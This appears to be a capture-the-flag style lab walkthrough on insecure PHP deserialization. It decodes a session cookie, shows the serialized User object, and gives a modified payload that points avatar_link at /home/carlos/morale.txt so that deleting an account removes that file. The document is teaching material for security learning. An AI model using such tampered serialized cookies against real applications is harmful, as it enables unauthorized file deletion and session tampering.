  • Credentials: wiener:peter


1.1 Objective
─────────────

  • Delete file at /home directory of Carlos user
  • Do that with modifications at deserialized object from Cookie


2 What is serialization ?
═════════════════════════

  Serialization is the process of converting complex data structures,
  such as objects and their fields, into a “flatter” format that can be
  sent and received as a sequential stream of bytes.

  Crucially, when serializing an object, its state is also persisted. In
  other words, the object’s attributes are preserved, along with their
  assigned values.


2.0.1 Serialization vs Deserialization

  Deserialization is the process of restoring this byte stream to a
  fully functional replica of the original object, in the exact state as
  when it was serialized.

  The website’s logic can then interact with this deserialized object,
  just like it would with any other object.


3 Deserialized object
═════════════════════

  • At web page lab, CTRL + SHIFT + i to open `dev tools'
    • Get the sessions cookie at `dev tools' Application > storage >
      Cookies
    • The cookie are Base64 encode, at terminal ->
  ――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
  ┌────
  │ echo 'Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJoaG5sYWJzZzlpcW1kNTMycXRya3h5eXRxNHQzMXhiYiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30=' | base64 -d
  └────

  • And we get an deserialized Object ->

    ┌────
    │ O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"hhnlabsg9iqmd532qtrkxyytq4t31xbb";s:11:"avatar_link";s:19:"users/wiener/avatar";}
    └────

  O -> Object s -> String s:3 -> string lenght ; -> separator

  • We can modify that object, encode base64 again, and send to web page
    at our original cookie place, with `dev tools'


4 Customized object
═══════════════════

  • Customize the user home path at cookie to carlos /home directory

    ┌────
    │ O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"hhnlabsg9iqmd532qtrkxyytq4t31xbb";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
    └────

    Now when click at delete account func, the deleted account will be
    carlos account

    !
